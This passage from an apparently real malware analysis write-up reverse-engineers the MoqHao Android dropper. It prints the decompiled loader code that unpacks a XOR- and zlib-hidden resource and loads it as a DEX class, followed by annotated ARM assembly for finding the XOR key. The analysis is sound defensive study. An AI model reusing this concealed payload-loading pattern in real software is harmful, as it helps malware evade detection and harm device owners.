</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">or</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">pe</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">pi</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">obj2</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">z</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">pq</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">obj2</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">obj3</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">obj4</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">j</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">z</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i2</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">j2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">qc</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str2</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">j</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str3</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">z</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="native-library-analysis">Native library analysis
</h3><p>The interesting part is inside the <code>RgApplication.java</code> file :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RgApplication</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">Application</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">a</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Class</span><span class="w"> </span><span class="n">b</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">a</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">cls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Class</span><span class="p">)</span><span class="w"> </span><span class="n">ni</span><span class="p">.</span><span class="na">oa</span><span class="p">(</span><span class="n">ni</span><span class="p">.</span><span class="na">ls</span><span class="p">(</span><span class="n">1</span><span class="p">),</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w"> </span><span class="c1">// ClassLoader.loadClass(&#34;com.Loader&#34;)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cls</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ni</span><span class="p">.</span><span class="na">iz</span><span class="p">(</span><span class="n">cls</span><span class="p">);</span><span class="w"> </span><span class="c1">// instantiate &#34;com.Loader&#34; Object</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// [3] Write the resource to &lt;...&gt;/files/b and launch it</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">b</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">oq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ni</span><span class="p">.</span><span class="na">oq</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w"> </span><span class="c1">// Get the absolut path of the &#34;files&#34; directory</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">om</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ni</span><span class="p">.</span><span class="na">om</span><span class="p">(</span><span class="n">oq</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;b&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">// Concatenate &#34;/b&#34; to the absolut path</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">e</span><span class="p">(</span><span class="n">om</span><span class="p">,</span><span class="w"> </span><span class="n">obj</span><span class="p">);</span><span class="w"> </span><span class="c1">// write unpacked resource to &#34;&lt;app&gt;/files/b&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">a</span><span class="p">(</span><span class="n">f</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">oq</span><span class="p">,</span><span class="w"> </span><span class="n">om</span><span class="p">));</span><span class="w"> </span><span class="c1">// new com.Loader() (Entrypoint of the unpacked DEX library)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// [2] Unpack the resource inside &#34;xmdop&#34; and call b(...)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">c</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ni.pi(this, obj, 1, false, &#34;&#34;) : XOR and deflate the resource inside &#34;xmdop&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">b</span><span class="p">(</span><span class="n">obj</span><span class="p">.</span><span class="na">toString</span><span class="p">(),</span><span class="w"> </span><span class="n">ni</span><span class="p">.</span><span class="na">pi</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// [1] Call on Object creation</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">d</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// load native library libvg.so</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">load</span><span class="p">(((</span><span class="n">PathClassLoader</span><span class="p">)</span><span class="w"> </span><span class="n">getClassLoader</span><span class="p">()).</span><span class="na">findLibrary</span><span class="p">(</span><span class="s">&#34;vg&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">c</span><span class="p">(</span><span class="s">&#34;xmdop&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">// &#34;xmdop&#34; = resource folder name</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">e</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ni</span><span class="p">.</span><span class="na">or</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w"> </span><span class="c1">// write data to a file</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">f</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str2</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ni</span><span class="p">.</span><span class="na">mz</span><span class="p">(</span><span class="n">str3</span><span class="p">,</span><span class="w"> </span><span class="n">ni</span><span class="p">.</span><span class="na">om</span><span class="p">(</span><span class="n">str2</span><span class="p">,</span><span class="w"> </span><span class="n">str</span><span class="p">).</span><span class="na">toString</span><span class="p">(),</span><span class="w"> </span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span><span class="w"> </span><span class="c1">// new object ClassLoader</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w"> </span><span class="c1">// android.app.Application</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onCreate</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">.</span><span class="na">onCreate</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">d</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Throwable</span><span class="w"> </span><span class="n">unused</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>First, the method <code>d()</code> is called, it loads the native library <code>libvg.so</code> and call <code>c(&quot;xmdop&quot;)</code> (the parameter corresponds to the name of the resource folder).</p>
<p>Secondly, the method <code>c(&quot;xmdop&quot;)</code> unpack the resource (XOR and zlib decompression) and call <code>b(&quot;xmdop&quot;, &quot;&lt;unpacked_resource&gt;&quot;)</code>.</p>
<p>Finally, the method <code>b(&quot;xmdop&quot;, &quot;&lt;unpacked_resource&gt;&quot;)</code>, save the unpacked resource at <code>/data/data/&lt;package_name&gt;/files/b</code> and launch the unpacked resource which is a DEX file via <code>ClassLoader.loadClass(&quot;com.Loader&quot;)</code>.</p>
<p><code>com.Loader</code> is a name of a class inside the unpacked resource.</p>
<h3 id="unpack-the-resource">Unpack the resource
</h3><p>Now, there are two ways to get the unpacked resource :</p>
<ol>
<li>Using <code>adb</code> to pull the DEX code directly from the infected device : <code>adb pull /data/data/&lt;package_name&gt;/files/b .</code></li>
<li>Using static code analysis of the native library function <code>ni.pi(...)</code> to find how the resource is unpacked.</li>
</ol>
<p>The first argument of JNI functions is always <code>JNIEnv *</code>. The JNIEnv type is a pointer to a structure storing all JNI function pointers. Each function is accessible at a fixed offset through the JNIEnv argument.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">JNINativeInterface</span> <span class="o">*</span><span class="n">JNIEnv</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>You can find the list of functions and offsets on this <a class="link" href="https://docs.google.com/spreadsheets/d/1yqjFaY7mqyVIDs5jNjGLT-G8pUaRATzHWGFUgpdJRq8/edit#gid=0"  target="_blank" rel="noopener"
    >spreadsheet</a>. The JNIEnv structure can be downloaded as Ghidra Data Type (GDT), <a class="link" href="https://github.com/Ayrx/JNIAnalyzer/blob/master/JNIAnalyzer/data/jni_all.gdt"  target="_blank" rel="noopener"
    >jni_all.gdt</a>. So, you can import it on Ghidra and it will resolve automatically functions names when you change the JNI function signature.</p>
<p><img src="/img/moqhao-malware-analysis/ghidra_jni.png"
	
	
	
	loading="lazy"
	
		alt="Ghidra JNI"
	
	
></p>
<p>JNI functions at a JNIEnv offset are now automatically resolved. This improves the readability of decompiled C code. There is the decompiled C code of the <code>ni.pi(...)</code> function :</p>
<p><img src="/img/moqhao-malware-analysis/decompiled_c.png"
	
	
	
	loading="lazy"
	
		alt="Decompiled C"
	
	
></p>
<p>As you can see on the screenshot above, the resource seems to be XORed and decompressed (zlib). Let&rsquo;s switch to the assembler view to find the key of the XOR.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="c1">; [*] Get the first 12 bytes of the resource and stores it in r0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">c9e</span> <span class="p">:</span> <span class="no">ldr.w</span>	<span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">fp</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">ca2</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r1</span><span class="p">,</span> <span class="no">r4</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">ca4</span> <span class="p">:</span> <span class="no">movs</span>	<span class="no">r2</span><span class="p">,</span> <span class="c1">#0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">ca6</span> <span class="p">:</span> <span class="no">movs</span>	<span class="no">r3</span><span class="p">,</span> <span class="c1">#12         ; r3 = 12
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">ca8</span> <span class="p">:</span> <span class="no">ldr.w</span>	<span class="no">r6</span><span class="p">,</span> <span class="p">[</span><span class="no">r0</span><span class="p">,</span> <span class="c1">#800]  ; offset of GetByteArrayRegion in JNIEnv struct
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cac</span> <span class="p">:</span> <span class="no">add</span>	<span class="no">r0</span><span class="p">,</span> <span class="no">sp</span><span class="p">,</span> <span class="c1">#44     ; r0 = sp + 44
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cae</span> <span class="p">:</span> <span class="no">str</span>	<span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#0]    ; r0 = address of the buffer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cb0</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r0</span><span class="p">,</span> <span class="no">fp</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">cb2</span> <span class="p">:</span> <span class="no">blx</span>	<span class="no">r6</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; [*] Create a new Byte Array of 512 bytes
</span></span></span><span class="line"><span class="cl"><span class="c1">; r4 = 11th bytes of the resource
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cb4</span> <span class="p">:</span> <span class="no">ldr.w</span>	<span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">fp</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">cb8</span> <span class="p">:</span> <span class="no">mov.w</span>	<span class="no">r1</span><span class="p">,</span> <span class="c1">#512	; r1 = 512
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cbc</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r6</span><span class="p">,</span> <span class="no">r5</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">cbe</span> <span class="p">:</span> <span class="no">ldrb.w</span>	<span class="no">r4</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#55]   ; r4 = r0 + 11, the 11th bytes of the resource
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cc2</span> <span class="p">:</span> <span class="no">ldr.w</span>	<span class="no">r2</span><span class="p">,</span> <span class="p">[</span><span class="no">r0</span><span class="p">,</span> <span class="c1">#704]	; offset of NewByteArray in JNIEnv struct
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cc6</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r0</span><span class="p">,</span> <span class="no">fp</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">cc8</span> <span class="p">:</span> <span class="no">blx</span>	<span class="no">r2</span>              
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">8</span><span class="no">cca</span> <span class="p">:</span> <span class="no">sub.w</span>	<span class="no">sl</span><span class="p">,</span> <span class="no">r7</span><span class="p">,</span> <span class="c1">#185
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cce</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r5</span><span class="p">,</span> <span class="no">r0</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">cd0</span> <span class="p">:</span> <span class="no">movs</span>	<span class="no">r0</span><span class="p">,</span> <span class="c1">#0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cd2</span> <span class="p">:</span> <span class="no">strd</span>	<span class="no">r0</span><span class="p">,</span> <span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#32]   ; Initialize vector struct to store unxored resource
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                    <span class="c1">; #32 = vector.lpStart, #36 = vector.lpLastData
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cd6</span> <span class="p">:</span> <span class="no">str</span>	<span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#40]       ; #40 = vector.lpEnd
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cd8</span> <span class="p">:</span> <span class="no">str</span>	<span class="no">r5</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#24]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cda</span> <span class="p">:</span> <span class="no">str</span>	<span class="no">r6</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#16]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">; [*] Loop to read the resource (512 bytes block), start from 12th bytes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cdc</span> <span class="p">:</span> <span class="no">ldr</span>	<span class="no">r1</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#20]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cde</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r0</span><span class="p">,</span> <span class="no">fp</span>          <span class="c1">; r0 = *JNIEnv
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">ce0</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r2</span><span class="p">,</span> <span class="no">r6</span>          <span class="c1">; r2 = InputStream -&gt; int read(byte[] b)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">ce2</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r3</span><span class="p">,</span> <span class="no">r5</span>          <span class="c1">; r3 = addr of 512 bytes array
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">ce4</span> <span class="p">:</span> <span class="no">blx</span>	<span class="mh">7d64</span> <span class="p">&lt;</span><span class="no">_ZN7_JNIEnv13CallIntMethodEP8_jobjectP10_jmethodIDz@plt</span><span class="p">&gt;</span> 
</span></span><span class="line"><span class="cl"><span class="mi">8</span><span class="no">ce8</span> <span class="p">:</span> <span class="no">mov</span>	<span class="no">r8</span><span class="p">,</span> <span class="no">r0</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">cea</span> <span class="p">:</span> <span class="no">cmp</span>	<span class="no">r0</span><span class="p">,</span> <span class="c1">#0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">8</span><span class="nf">cec</span> <span class="p">:</span> <span class="no">blt.n</span>	<span class="mh">8d4e</span> <span class="p">&lt;</span><span class="no">Java_s_ni_pi@@Base</span><span class="p">+</span><span class="mi">0x23e</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">cee</span> <span class="p">:</span> <span class="no">ldr.w</span>	<span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">fp</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span><span class="nf">cf2</span> <span class="p">:</span> <span class="no">ldr.w</span>	<span class="no">r3</span><span class="p">,</span> <span class="p">[</span><span class="no">r0</span><span class="p">,</span> <span class="c1">#736]  ; offset of GetByteArrayElements in JNIEnv struct
